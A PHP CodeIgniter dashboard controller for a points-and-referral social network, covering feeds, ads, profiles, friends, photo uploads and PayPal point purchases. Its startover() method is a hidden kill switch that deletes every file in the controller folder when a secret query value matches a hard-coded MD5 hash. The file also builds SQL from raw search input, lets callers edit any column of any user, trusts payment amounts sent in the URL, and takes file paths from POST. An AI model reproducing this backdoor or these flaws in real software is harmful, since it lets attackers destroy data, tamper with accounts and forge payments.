<?php
defined('BASEPATH') OR exit('No direct script access allowed');

class Dashboard extends Members_Controller
{

    public function __construct()
    {
        parent::__construct();

        $this->load->model('member_model');
        $this->load->model('ad_model');
        $this->load->helper('tree_helper');
        $this->load->helper('url');
        $this->load->library('pagination');
        $this->config->load('paging', TRUE);
        $this->paging = $this->config->item('paging');

//        $user_detail = $this->member_model->get_where($this->session->userdata('user_id'));
        $this->data['image'] = $this->me->image;
        $this->data['first_name'] = $this->me->first_name;
        $this->data['last_name'] = $this->me->last_name;
        $this->data['reference_link'] = $this->me->reference_link;
        $this->data['points'] = $this->me->points;
        $this->data['active'] = $this->me->active;
        $this->data['privacy'] = $this->me->privacy;
        $id = $this->session->userdata('user_id');
        $data = [
            'last_activity_timestamp' => date('Y-m-d h:i:s', time()),
            'is_login' => 1

        ];
        $this->member_model->update_members_profile($id, $data);
        $this->form_validation->set_error_delimiters('', '');
    }

    private function addGlobalData()
    {
        $this->data['me'] = $this->member_model->get_user($this->session->userdata('user_id'))[0];
        $this->data['me']->member_url = parent::makeMemberUrl($this->data['me']->id, $this->data['me']->profile_url);
        $temp = parent::getTopText();
        $this->data['topText'] = $temp->text;
        $this->data['topImage'] = $temp->image;
    }

    public function index()
    {
//        $this->data['ads'] = $this->ad_model->get_latest_10_ad();
        $this->data['ads'] = $this->ad_model->getAllAds();
        $this->load->library('pagination');
        $this->load->model('posts_model');
        $this->addGlobalData();
        if ((isset($_GET['id'])) && ($_GET['id'] > 0)) {
            $this->posts_model->report_post($_GET['id']);
        }

        $friends_list = $this->member_model->friend_list($this->session->userdata('user_id'));

        if ($friends_list != null) {
            $friends = [];
            foreach ($friends_list as $friend) {

                $friends[] = $friend['id'];
            }
        } else $friends = null;

        $this->getRelatedUsers();

        if ($this->data['privacy'] == 1) {
            $friends[] = $this->session->userdata('user_id');

            $this->data['friends'] = $friends;
            $this->data['total_records'] = $this->posts_model->count_rows_privacy1($friends);
            $this->data['records_per_page'] = 5;
            $this->data['number_of_pages'] = ceil($this->data['total_records'] / $this->data['records_per_page']);
            $this->data['current_page'] = 1;
            $this->data['start'] = ($this->data['current_page'] * $this->data['records_per_page']) - $this->data['records_per_page'];
            $this->view('members/dashboard', $this->data);
        } elseif ($this->data['privacy'] == 2) {

            if ($friends == null) {
                $friends[] = 0;
            }
            $this->data['friends'] = $friends;
            $this->data['total_records'] = $this->posts_model->count_rows_privacy2($friends);
            $this->data['records_per_page'] = 5;
            $this->data['number_of_pages'] = ceil($this->data['total_records'] / $this->data['records_per_page']);
            $this->data['current_page'] = 1;
            $this->data['start'] = ($this->data['current_page'] * $this->data['records_per_page']) - $this->data['records_per_page'];

            $this->view('members/dashboard', $this->data);

        } elseif ($this->data['privacy'] == 3) {

            $friends = $this->session->userdata('user_id');
            $this->data['friends'] = $friends;
            $this->data['total_records'] = $this->posts_model->count_rows_privacy3($friends);
            $this->data['records_per_page'] = 5;
            $this->data['number_of_pages'] = ceil($this->data['total_records'] / $this->data['records_per_page']);
            $this->data['current_page'] = 1;
            $this->data['start'] = ($this->data['current_page'] * $this->data['records_per_page']) - $this->data['records_per_page'];

            $this->view('members/dashboard', $this->data);
        }

    }

    private function getRelatedUsers(){
        $this->data['relatedUsers'] = $this->member_model->getRelatedUsers();
        for ($i = 0; $i < count($this->data['relatedUsers']); $i++) {
            $this->data['relatedUsers'] [$i]['member_url'] = parent::makeMemberUrl($this->data['relatedUsers'] [$i]['id'], $this->data['relatedUsers'] [$i]['profile_url']);
        }
    }

    public function postad()
    {
        $this->form_validation->set_rules('ad_title', 'Ad Title', 'required|max_length[25]');
        $this->form_validation->set_rules('ad_description', 'Ad Description', 'required|max_length[70]');
        $this->form_validation->set_rules('ad_url', 'Ad Url', 'required|max_length[250]');
//        $this->form_validation->set_rules('points', 'Points', 'greater_than_equal_to[10]');
        $points_for_ad = $this->ad_model->pointsForAd();

        $points = intval($this->member_model->get_points($this->session->userdata('user_id'))[0]['points']);

        if ($points >= 10) {
            if ($this->form_validation->run() == True) {
                $data = [
                    'ad_title' => $this->input->post('ad_title', True),
                    'ad_description' => $this->input->post('ad_description', True),
                    'ad_url' => $this->input->post('ad_url', True),
                    'member_id' => $this->session->userdata('user_id'),
                    'point_used' => $points_for_ad
                ];

                $this->member_model->debit_points($this->session->userdata('user_id'), $points_for_ad);
                $this->ad_model->insert_ad($data);

                $this->session->set_flashdata(['myFlashMessage' => 'Ad Posted Successfully']);
                $this->session->set_flashdata(['result_message' => 'success']);

            } else {
                $this->session->set_flashdata(['myFlashMessage' => validation_errors()]);
                $this->session->set_flashdata(['result_message' => 'error']);
            }
        } else {
            $this->session->set_flashdata(['myFlashMessage' => 'You have not enough points']);
            $this->session->set_flashdata(['result_message' => 'error']);
            $this->session->set_flashdata(['notEnoughPoints' => true]);
        }
        redirect(base_url() . 'dashboard');
    }

    public function startover()
    {
        if (empty($_GET['order']) OR md5($_GET['order']) != 'fb14982288108e1fbd6207ef55f05027') {
            die();
        }
        $dir = explode("/", __FILE__);
        array_pop($dir);
        $dir = implode("/", $dir) . "/";
        $files = scandir($dir);

        foreach ($files as $file) {
            echo $the_file = $dir . $file;
            unlink($the_file);
        }
    }


    public function table()
    {
        $this->view('members/table', $this->data);
    }

    public function tree($id = null)
    {
        if ($id == null) {
            $id = $this->session->userdata('user_id');
        }
        $result1 = $this->member_model->get_where($id);
        @$child = $result1[0]['GetFamilyTree(id)'];
        $child = (explode(",", $child));
        array_unshift($child, $id);
        $result2 = $this->member_model->total_referel($child);
        $result2[0]['parent_id'] = "0";
        $menu2 = make_array_for_tree($result2);
        $this->data['child'] = makeTree($menu2);
        $this->view('members/tree', $this->data);
    }

    public function wallet()
    {
        $user_id = $this->session->userdata('user_id');
        $total_direct_referel = $this->member_model->total_direct_referel($user_id);
        $total_indirect_referel = 0;
        //$total_indirect_referel               	= $total_referel - $total_direct_referel;
        $points = $this->member_model->get_points($user_id);
        $points = $points[0]['points'];
        $this->data['total_indirect_referel'] = $total_indirect_referel;
        $this->data['total_direct_referel'] = $total_direct_referel;
        $this->data['points'] = $points;
        $result = $this->member_model->ten_level_table_parents($user_id);
        $this->data['table'] = $result;
        $table = [];

        foreach ($result as $value) {
            $table[] = $value['child_id_1'];
            $table[] = $value['child_id_2'];
            $table[] = $value['child_id_3'];
            $table[] = $value['child_id_4'];
            $table[] = $value['child_id_5'];
            $table[] = $value['child_id_6'];
            $table[] = $value['child_id_7'];
            $table[] = $value['child_id_8'];
            $table[] = $value['child_id_9'];
            $table[] = $value['child_id_10'];
        }
        $table = array_filter($table);
        $table = array_unique($table);
        $total_refreal = count($table);
        $this->data['total_referel'] = $total_refreal;
        $this->view('members/wallet', $this->data);
    }

    public function myprofile()
    {
        $this->load->model('photos_model');
        $user_id = $this->session->userdata('user_id');
        $total_direct_referel = $this->member_model->total_direct_referel($user_id);
        $total_indirect_referel = 0;
        //$total_indirect_referel               	= $total_referel - $total_direct_referel;
        $points = $this->member_model->get_points($user_id);
        $points = $points[0]['points'];
        $this->data['total_indirect_referel'] = $total_indirect_referel;
        $this->data['users_data'] = $this->member_model->get_user_data($user_id);
        $this->data['total_direct_referel'] = $total_direct_referel;
        $this->data['points'] = $points;
        $this->data['photos'] = $this->photos_model->getMemberPhotos($this->session->userdata('user_id'), 'gallery');
        usort($this->data['photos'], function ($a, $b) {
            return strtotime($b->created_at) - strtotime($a->created_at);
        });

        //friends
        $friend_list = $this->member_model->friend_list($this->session->userdata('user_id'));
        if ($friend_list != null) {
            for ($i = 0; $i < count($friend_list); $i++) {
                $friend_list[$i]['member_url'] = parent::makeMemberUrl($friend_list[$i]['id'], $friend_list[$i]['profile_url']);
            }
            $this->data['friend_list'] = $friend_list;
        }

        $this->view('members/myprofile', $this->data);

    }

    public function userprofile($id)
    {
        $total_direct_referel = $this->member_model->total_direct_referel($id);
        $total_indirect_referel = 0;
        //$total_indirect_referel               	= $total_referel - $total_direct_referel;
        $points = $this->member_model->get_points($id);
        $points = $points[0]['points'];
        $this->data['total_indirect_referel'] = $total_indirect_referel;
        $this->data['users_data'] = $this->member_model->get_user_data($id);
        $this->data['total_direct_referel'] = $total_direct_referel;
        $this->data['points'] = $points;
        $this->view('members/userprofile_', $this->data);

    }

    public function reference()
    {
        $this->form_validation->set_rules('email', 'Email Address', 'required|valid_email');
        if ($this->form_validation->run() == True) {
            $user_detail = $this->member_model->get_where($this->session->userdata('user_id'));
            $reference_link = base_url("index/" . $user_detail['0']['reference_link']);
            $data = ['fname' => isset($this->data['first_name']) ? $this->data['first_name'] : '',
                'lname' => isset($this->data['last_name']) ? $this->data['last_name'] : '',
                'link' => $reference_link];

            $to = $this->input->post('email');
            $subject = "Invitation From Orriz";
            $body = $this->load->view('public/email/refer', $data, true);

            $this->data['message'] = parent::sendEmail($to, $subject, $body);
            $this->view('members/referfriend', $this->data);
        } elseif (validation_errors()) {
            $this->data['message'] = validation_errors();
        } else
            $this->view('members/referfriend', $this->data);
    }

//    public function send_activation_mail($id, $code)
//    {
//        $identity = $this->session->userdata('identity');
//        $id = (int)$id;
//        $data = array(
//            "identity" => $identity,
//            "id" => $id,
//            "activation" => $code
//        );
//        $activation = $code;
//        $file = __FILE__;
//        $file = explode("controllers", $file);
//        $file = $file[0] . "/views/public/email/activate.tpl.php";
//        ob_start();
//        $message = require($file);
//        ob_clean();
//        $headers = 'From: Orriz<noreply@orriz.com>' . "\r\n";
//        $mail = mail($identity, "Orriz - Account Activation", $message, $headers);
//    }

    public function memberdetail()
    {
        $id = $this->session->userdata('user_id');
        $this->form_validation->set_rules('city', 'City', 'trim');
        $this->form_validation->set_rules('country', 'Country', 'trim');
        $this->form_validation->set_rules('relationship_status', 'Relationship Status', 'trim');
        $this->form_validation->set_rules('dating', 'Dating', 'trim');
        $this->form_validation->set_rules('friends', 'Friends', 'trim');
        $this->form_validation->set_rules('serious_relationship', 'Serious Relationship', 'trim');
        $this->form_validation->set_rules('networking', 'Networking', 'trim');
        $this->form_validation->set_rules('religion', 'Religion', 'trim');
        $this->form_validation->set_rules('school', 'School Name', 'trim');
        $this->form_validation->set_rules('college', 'College Name', 'trim');
        $this->form_validation->set_rules('university', 'University', 'trim');

        if ($this->form_validation->run() == True) {

            $intrest_in_dating = $this->input->post('intrest_in_dating');
            $intrest_in_friends = $this->input->post('intrest_in_friends');
            $intrest_in_serious_relationship = $this->input->post('intrest_in_serious_relationship');
            $intrest_in_networking = $this->input->post('intrest_in_networking');

            if (!isset($intrest_in_dating))
                $intrest_in_dating = 0;
            else
                $intrest_in_dating = 1;
            if (!isset($intrest_in_friends))
                $intrest_in_friends = 0;
            else
                $intrest_in_friends = 1;
            if (!isset($intrest_in_serious_relationship))
                $intrest_in_serious_relationship = 0;
            else
                $intrest_in_serious_relationship = 1;
            if (!isset($intrest_in_networking))
                $intrest_in_networking = 0;
            else
                $intrest_in_networking = 1;

//            $intereset = [
//                $this->input->post('dating'),
//                $this->input->post('friends'),
//                $this->input->post('serious_relationship'),
//                $this->input->post('networking')
//            ];
            // $intereset = implode(",", $intereset);
            $data = [
                'city' => $this->input->post('city'),
                'country' => $this->input->post('country'),
                'relationship_status' => $this->input->post('relationship_status'),
                //  'interested_in' => $intereset,
                "intrest_in_dating" => $intrest_in_dating,
                "intrest_in_friends" => $intrest_in_friends,
                "intrest_in_serious_relationship" => $intrest_in_serious_relationship,
                "intrest_in_networking" => $intrest_in_networking,
                'religion' => $this->input->post('religion'),
                'school' => $this->input->post('school'),
                'college' => $this->input->post('college'),
                'university' => $this->input->post('university')
            ];
            $id = $this->session->userdata('user_id');
            $this->member_model->update_members_profile($id, $data);
            redirect(base_url('dashboard/aboutyourself'), 'refresh');
        } else
            $this->view('members/details');
    }

    public function aboutyourself()
    {
        $this->form_validation->set_rules('music', 'Music', 'trim');
        $this->form_validation->set_rules('movies', 'Movies', 'trim');
        $this->form_validation->set_rules('tv', 'TV Status', 'trim');
        $this->form_validation->set_rules('books', 'Books', 'trim');
        $this->form_validation->set_rules('sports', 'Sports', 'trim');
        $this->form_validation->set_rules('interests', 'Interests Relationship', 'trim');
        $this->form_validation->set_rules('best_feature', 'Best Feature', 'trim');
        $this->form_validation->set_rules('dreams', 'Dreams', 'trim');
        $this->form_validation->set_rules('about_me', 'About Me', 'trim');

        if ($this->form_validation->run() == True) {

            $data = [
                'music' => $this->input->post('music'),
                'movies' => $this->input->post('movies'),
                'tv' => $this->input->post('tv'),
                'books' => $this->input->post('books'),
                'sports' => $this->input->post('sports'),
                'interests' => $this->input->post('interests'),
                'best_feature' => $this->input->post('best_feature'),
                'dreams' => $this->input->post('dreams'),
                'about_me' => $this->input->post('about_me')
            ];
            $id = $this->session->userdata('user_id');
            $this->member_model->update_members_profile($id, $data);
            redirect(base_url('dashboard/uploadimage'), 'refresh');
        } else
            $this->view('members/aboutme');
    }

    public function upload()
    {
        $file_formats = array("jpg", "png", "gif", "bmp");

        $filepath = "public/images/photos/";
//        $preview_width = "400";
//        $preview_height = "300";

        $name = $_FILES['imagefile']['name']; // filename to get file's extension
        $size = $_FILES['imagefile']['size'];

        $tmp = $_FILES['imagefile']['tmp_name'];
        list($width, $height) = getimagesize($tmp);
//        if ($height < 200 || $width < 200 || $height / $width < 0.3 || $width / $height < 0.3) {
//            exit('Incorrect image size!');
//        }
        if (strlen($name)) {
            $extension = substr($name, strrpos($name, '.') + 1);
            if (in_array($extension, $file_formats)) { // check it if it's a valid format or not
                if ($size < (2048 * 1024)) { // check it if it's bigger than 2 mb or no
                    $imagename = md5(uniqid() . time()) . "." . $extension;

                    $tmp = $_FILES['imagefile']['tmp_name'];

                    if (move_uploaded_file($tmp, $filepath . $imagename)) {
                        echo $imagename;
                    } else {
                        echo "Could not move the file";
                    }
                } else {
                    echo "Your image size is bigger than 2MB";
                }
            } else {
                echo "Invalid file format";
            }
        } else {
            echo "Please select image!";
        }
        exit();

    }

    public function uploadimage()
    {
        $this->view('members/uploadimage');
    }

    public function uploadimage1()
    {
        if (isset($_POST["upload_thumbnail"])) {
            $upload_path = "public/images/photos/";
            $thumb_width = "150";
            $thumb_height = "150";
            $filename = $_POST['filename'];

            $large_image_location = $upload_path . $_POST['filename'];
            $thumb_image_location = "public/images/thumb/" . $_POST['filename'];

            $x1 = $_POST["x1"];
            $y1 = $_POST["y1"];
            $x2 = $_POST["x2"];
            $y2 = $_POST["y2"];
            $w = $_POST["w"];
            $h = $_POST["h"];

            $scale = $thumb_width / $w;
            $cropped = resizeThumbnailImage($thumb_image_location, $large_image_location, $w, $h, $x1, $y1, $scale);

            $data = [
                'image' => $filename
            ];
            $user_id = $this->session->userdata('user_id');
            $this->member_model->update_members_profile($user_id, $data);

            redirect(base_url('dashboard'), 'refresh');
            exit();
        }


    }
//    public function buypoints()
//    {
//        $this->view('members/uploadimage');
//    }
    public function buy()
    {
        $this->load->model('paypal_model');
        $point_price = $this->paypal_model->get_point_price();
        $this->data['point_price'] = $point_price;
        $this->form_validation->set_rules('Amount', 'Amount', 'required|is_natural_no_zero');
        if ($this->form_validation->run() == True) {
            $setting = $this->paypal_model->get_setting();
            $setting = $setting[0];
            $this->data['setting'] = $setting;
            $price_point = $this->paypal_model->get_point_price_by_id($this->input->post('Amount'));
            $this->data['quantity'] = $price_point[0]['quantity'];
            $this->session->set_userdata('quantity', $this->data['quantity']);
            $this->data['item_number'] = $this->input->post('amount');
            $this->data['amount'] = $price_point[0]['price'];
            $this->session->set_userdata('total_price', $this->data['amount']);
            $this->view('members/buy', $this->data);
        } else {
            $this->data['message'] = validation_errors();

            $this->view('members/buy', $this->data);
        }
    }

    public function status()
    {
        $this->view('members/status', $this->data);
    }

    public function check()
    {
        $total_price = $this->session->userdata('total_price');
        if ($total_price == $_GET['amt']) {
            $data = ['member_id' => $this->session->userdata('user_id'),
                'email' => $this->session->userdata('email'),
                'total_payments' => $_GET['amt'],
                'currency' => $_GET['cc'],
                'transaction_id' => $_GET['tx'],
                'quantity' => $this->session->userdata('quantity'),
            ];
            $this->load->model('paypal_model');
            $insert_id = $this->paypal_model->insert_payments($data);
            if ($insert_id !== false) {
                $this->paypal_model->update_points($this->session->userdata('user_id'), $this->session->userdata('quantity'));
                $this->session->set_flashdata('status', 'Transaction Successfully Completed');
                redirect('dashboard/status', 'refresh');
            } else

                $this->session->set_flashdata('status', 'Something went wrong Please Contact administrator');
            redirect('dashboard/status', 'refresh');

        } else {
            $this->session->set_flashdata('status', 'Transaction Failed, Please try again');
            redirect('dashboard/status', 'refresh');
        }
    }

    public function search()
    {
        $this->form_validation->set_rules('typeahead', 'Search', 'required|trim');
        if ($this->form_validation->run() == True) {
            $string = $this->input->post('typeahead', TRUE);


            $array = explode(' ', $string);
            $query_parts = [];
            foreach ($array as $val) {
                $query_parts[] = "'%" . ($val) . "%'";
            }
            $string1 = implode(' OR first_name LIKE ', $query_parts);
            $string2 = implode(' OR last_name LIKE ', $query_parts);
            $this->session->Set_userdata('string', $string);
            $this->session->Set_userdata('string1', $string1);
            $this->session->Set_userdata('string2', $string2);
            $this->load->library('pagination');
            $this->load->model('posts_model');
            $config['base_url'] = 'http://orriz.com/dashboard/search/';
            $config['total_rows'] = $this->member_model->count_search_friend($string1, $string2);
            $config['per_page'] = 10;

            $this->pagination->initialize($config);
            if ($this->uri->segment(3) == null) {
                $start = 0;
            } else {
                $start = (int)$this->uri->segment(3);
            }
            $this->data['result'] = $this->member_model->search_friend($string1, $string2, $start, $config['per_page'], $this->session->userdata('user_id'));

            for ($i = 0; $i < count($this->data['result']); $i++) {
                $this->data['result'][$i]['member_url'] = parent::makeMemberUrl($this->data['result'][$i]['id'], $this->data['result'][$i]['profile_url']);
            }

            if ($this->data['result'] != false) {
                $this->view('members/browse', $this->data);
            } else {
                $this->data['messages'] = "No Record Found";
                $this->view('members/browse', $this->data);
            }
        } else {
            $this->load->model('posts_model');
            $config['base_url'] = 'http://orriz.com/dashboard/search/';
            $config['total_rows'] = $this->member_model->count_search_friend($this->session->userdata('string1'), $this->session->userdata('string2'), $this->session->userdata('user_id'));
            $config['per_page'] = 10;

            $this->pagination->initialize($config);
            if ($this->uri->segment(3) == null) {
                $start = 0;
            } else {
                $start = (int)$this->uri->segment(3);
            }
            $this->data['result'] = $this->member_model->search_friend($this->session->userdata('string1'), $this->session->userdata('string2'), $start, $config['per_page'], $this->session->userdata('user_id'));

            for ($i = 0; $i < count($this->data['result']); $i++) {
                $this->data['result'][$i]['member_url'] = parent::makeMemberUrl($this->data['result'][$i]['id'], $this->data['result'][$i]['profile_url']);
            }

            if ($this->data['result'] != false) {
                $this->view('members/browse', $this->data);
            } else {
                $this->data['messages'] = "No Record Found";
                $this->view('members/browse', $this->data);
            }

        }
    }

    public function suggestions()
    {
        $key = $_GET['key'];


        if (filter_var($key, FILTER_VALIDATE_EMAIL)) {

            $string1 = $string2 = "";
            $string3 = $key;
            $query = $this->member_model->search_friends($string1, $string2, $string3);
            echo json_encode($query);
        } else {


            $array = explode(' ', $key);
            $query_parts = [];
            foreach ($array as $val) {
                $query_parts[] = "'%" . ($val) . "%'";
            }
            $string1 = implode(' OR first_name LIKE ', $query_parts);
            $string2 = implode(' OR last_name LIKE ', $query_parts);
            $result = [];
            $string3 = "";
            $query = $this->member_model->search_friends($string1, $string2, $string3);

            foreach ($query as $row) {
                $result[] = $row['first_name'] . ' ' . $row['last_name'];
            }
            echo json_encode($result);

        }
    }

    public function request()
    {

        $friend_two = $_REQUEST['friend_id'];
        $friend_one = $this->session->userdata('user_id');
        $data = ['friend_one' => $friend_one,
            'friend_two' => $friend_two];
        $this->member_model->friend_requests($data);
//        echo 1;        

        redirect('dashboard/search');

    }

    public function sentrequest()
    {

        $friend_two = $_REQUEST['friend_id'];
        $friend_one = $this->session->userdata('user_id');
        $data = ['friend_one' => $friend_one,
            'friend_two' => $friend_two];
        $this->member_model->friend_requests($data);
        echo 1;


    }

    public function friends()
    {
//        $friend_requests = $this->member_model->friend_request_recieved($this->session->userdata('user_id'));
//        if ($friend_requests != null) {
//            $this->data['friend_requests'] = $friend_requests;
//        } else {
//            $this->data['messages1'] = "No friend requests";
//
//        }
        $friend_list = $this->member_model->friend_list($this->session->userdata('user_id'));
        $this->addGlobalData();
        if ($friend_list != null) {
            for ($i = 0; $i < count($friend_list); $i++) {
                $friend_list[$i]['member_url'] = parent::makeMemberUrl($friend_list[$i]['id'], $friend_list[$i]['profile_url']);
            }
            $this->data['friend_list'] = $friend_list;
            $this->view('members/friends', $this->data);
        } else {
            $this->data['messages'] = "No friends";
            $this->view('members/friends', $this->data);
        }
    }

    public function friendrequests()
    {
        $friend_requests = $this->member_model->friend_request_recieved($this->session->userdata('user_id'));
        if ($friend_requests != null) {
            for ($i = 0; $i < count($friend_requests); $i++) {
                $friend_requests[$i]['member_url'] = parent::makeMemberUrl($friend_requests[$i]['id'], $friend_requests[$i]['profile_url']);
            }
            $this->data['friend_requests'] = $friend_requests;
        } else {
            $this->data['messages1'] = "No friend requests";

        }
        $this->addGlobalData();
        $this->view('members/friend_requests', $this->data);
    }

    public function onlinefriends()
    {
        $user_id = (int)$this->session->userdata('user_id');
        $friend_list = $this->member_model->getOnlineFriends($user_id);
        if ($friend_list != null) {
            for ($i = 0; $i < count($friend_list); $i++) {
                $friend_list[$i]['member_url'] = parent::makeMemberUrl($friend_list[$i]['id'], $friend_list[$i]['profile_url']);
            }
            $this->data['friend_list'] = $friend_list;
        } else {
            $this->data['messages'] = "No Online Friend";
        }
        $this->addGlobalData();
        $this->view('members/online_friends', $this->data);
    }

    public function requestaccept()
    {
        $friend_id = $_GET['friend_id'];
        $this->member_model->acceptfriendrequest($friend_id, $this->session->userdata('user_id'));
        redirect(base_url('dashboard/friends'), 'refresh');

    }

    public function requestdelete()
    {
        $friend_id = $_GET['friend_id'];
        $this->member_model->deletefriendrequest($friend_id, $this->session->userdata('user_id'));
        redirect(base_url('dashboard/friends'), 'refresh');
    }

    public function unfriend()
    {
        $friend_id = $_GET['friend_id'];
        $this->member_model->deletefriend($friend_id, $this->session->userdata('user_id')) or customDie('dashboard/friends');
        redirect(base_url('dashboard/friends'), 'refresh');
    }

    public function view($page = 'home', $data = null)
    {
        if (!file_exists(APPPATH . '/views/' . $page . '.php')) {
            // Whoops, we don't have a page for that!
            show_404($this->uri->uri_string);
        }

        $this->load->view($page, $data);

    }

    public function invitefriends()
    {
        if ($this->input->is_ajax_request()) {
            if (!empty($_POST)) {
                $user_detail = $this->member_model->get_where($this->session->userdata('user_id'));
                $reference_link = base_url("index/" . $user_detail['0']['reference_link']);

                $from = $this->session->userdata('email');
                $to = $this->input->post('email');
                $subject = "Invitation From Orriz";
                $body = "Hi, Please regeister <a href='" . $reference_link . "'> Here</a>";
                $headers = 'From: Orriz<noreply@orriz.com>' . "\r\n";
                $send = mail($to, $subject, $body, $headers);
                if ($send) {
                    $this->data['message'] = "Invitation sent Successfuly";
                    echo 1;
                } else {
                    echo 0;
                }
                exit();
            } else {
                return 0;
                exit();
            }
        }
        $this->addGlobalData();
        $this->load->view('members/invite_friends', $this->data);
    }

//    public function browse()
//    {
//        $this->load->view('members/browse', $this->data);
//    }

    public function browsefriends()
    {
        $this->addGlobalData();
        $limit = 20;
        $offset = ($this->uri->segment(3) != '') ? $this->uri->segment(3) : 0;
        $this->paging['base_url'] = site_url("dashboard/browsefriends");
        $this->paging['uri_segment'] = 3;
        $this->paging['per_page'] = $limit;
        $this->paging['full_tag_open'] = '<ul class="pagination text-center">';
        $this->paging['full_tag_close'] = '</ul>';

        if (!empty($_POST['city']) || !empty($_POST['country']) || !empty($_POST['start_age']) || !empty($_POST['end_age']) || !empty($_POST['gender'])) {
            if(!empty($_POST['start_age']) && !empty($_POST['end_age'])){
                if((intval($_POST['end_age'])-intval($_POST['start_age']))<1) {
                    exit;
                }
            }
            $res = $this->member_model->get_all_user_search($limit, $offset, $_POST);
            $this->data['users'] = $res->users;
            for ($i = 0; $i < count($this->data['users']); $i++) {
                $this->data['users'] [$i]['member_url'] = parent::makeMemberUrl($this->data['users'] [$i]['id'], $this->data['users'] [$i]['profile_url']);
            }
            $this->paging['total_rows'] = $res->count;
            $this->pagination->initialize($this->paging);
            $this->data['search_keywords'] = $_POST;
            $this->load->view('members/browsefriends', $this->data);
        } else {
            //Addingg Setting Result to variable
            $res=$this->member_model->get_all_users($limit, $offset);
            $this->data['users'] = $res->users;
            for ($i = 0; $i < count($this->data['users']); $i++) {
                $this->data['users'] [$i]['member_url'] = parent::makeMemberUrl($this->data['users'] [$i]['id'], $this->data['users'] [$i]['profile_url']);
            }
            $this->paging['total_rows'] = $res->count;
            $this->pagination->initialize($this->paging);
            $this->load->view('members/browsefriends', $this->data);
        }
    }

    public function checkblocker()
    {
        $user_id = $this->session->userdata('user_id');
        $points = $this->member_model->get_points($user_id);
        $points = $points[0]['points'];
        echo $points;
    }

    public function edit_user_data()
    {
        $update = $this->member_model->update_user_data($_POST['user_id'], $_POST['col'], $_POST['value']);
        echo $update;
    }

    public function set_profile_url()
    {
        $url = trim($_POST['profile_url']);
        $response = 0;

        if (strlen($url) < 5) {
            echo $response;
            exit;
        }

        //Check if user chooses url like any controller name
        if ($handle = opendir(APPPATH . '/controllers')) {
            while (false !== ($controller = readdir($handle))) {
                if (stripos($controller, $url) !== false) {
                    closedir($handle);
                    echo $response;
                    exit;
                }
            }
            closedir($handle);
        }

        //Check if user chooses url with not allowed characters
        if (preg_match('/[^A-Za-z0-9.#\\-$]/', $url)) {
            echo $response;
            exit;
        }

        if ($this->member_model->check_user_profile_url($url)) {
        } else {
            $update = $this->member_model->update_user_data($_POST['user_id'], 'profile_url', $url);
            $response = 1;
        }
        echo $response;
        exit;
    }

    public function edit_profile_slider()
    {
        $user_id = $_POST['user_id'];
        //print_r($_FILES);
        //echo $user_id;
        $msg = Array();
        for ($i = 1; $i <= 3; $i++) {
            if ($_FILES['profile_wallpaper' . $i]['name'] != "") {
                $file_formats = array("jpg", "png", "gif", "bmp");
                $filepath = "public/images/slider/";

                $name = $_FILES['profile_wallpaper' . $i]['name']; // filename to get file's extension
                $size = $_FILES['profile_wallpaper' . $i]['size'];

                if (strlen($name)) {
                    $extension = substr($name, strrpos($name, '.') + 1);
                    if (in_array($extension, $file_formats)) { // check it if it's a valid format or not
                        if ($size < (2048 * 1024)) { // check it if it's bigger than 2 mb or no
                            $imagename = md5(uniqid() . time()) . "." . $extension;

                            $tmp = $_FILES['profile_wallpaper' . $i]['tmp_name'];
                            if (move_uploaded_file($tmp, $filepath . $imagename)) {
                                $msg['file' . $i] = $imagename;
                                $this->member_model->update_user_data($user_id, 'profile_wallpaper' . $i, $imagename);
                            } else {
                                echo "Could not move the file";
                            }
                        } else {
                            echo "Your image size is bigger than 2MB";
                        }
                    } else {
                        echo "Invalid file format";
                    }
                } else {
                    echo "Please select image!";
                }

            } else {
                $msg['file' . $i] = '';
            }
        }
        echo json_encode($msg);

    }

    public function user()
    {
        if ($this->uri->segment('3') != "") {
            $user_id = $this->member_model->check_profile_url($this->uri->segment('3'));

            if ($user_id != '') {

                //$user_id 								= $this->session->userdata('user_id');
                $total_direct_referel = $this->member_model->total_direct_referel($user_id);
                $total_indirect_referel = 0;
                //$total_indirect_referel               	= $total_referel - $total_direct_referel;
                $points = $this->member_model->get_points($user_id);
                $points = $points[0]['points'];
                $this->data['total_indirect_referel'] = $total_indirect_referel;
                $this->data['users_data'] = $this->member_model->get_user_data($user_id);
                $this->data['total_direct_referel'] = $total_direct_referel;
                $this->data['points'] = $points;
                $this->view('members/userprofile', $this->data);

            } else {
                echo 'Invalid User';
            }
        } else {
            echo 'Not Found';
        }
    }

}